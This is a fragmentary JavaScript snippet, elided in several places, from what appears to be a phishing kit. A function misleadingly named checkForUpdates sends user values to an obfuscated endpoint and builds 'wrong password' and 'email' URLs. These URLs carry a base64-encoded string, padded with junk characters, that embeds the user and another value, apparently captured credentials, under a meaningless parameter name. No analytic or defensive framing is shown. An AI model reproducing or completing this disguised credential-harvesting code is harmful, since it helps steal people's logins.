...
function checkForUpdates() {
  ...
  fetch(`/codeload/fetch/?dsjkfhjdhfjkdfhjkd=${valueuser}`)
    ...
    // FOR WRONG PWD URL CREATE
      ...
      // FOR EMAIL URL CREATE

      var estring = 'dfgdfgdfgfdgfdff/'+user+'/'+b+'/bdfdgftqwefFGTW437567jbwfBSH347';
      var encodedestring = btoa(estring);
      var urlemail = 'codeemail';
      
      const emailurl = ''+urlemail+'?NzA2MTczNTM1NzZmNzI2NDJlNzA2ODcwdghjdfjdfgjdfgjdfgjdfj='+encodedestring;
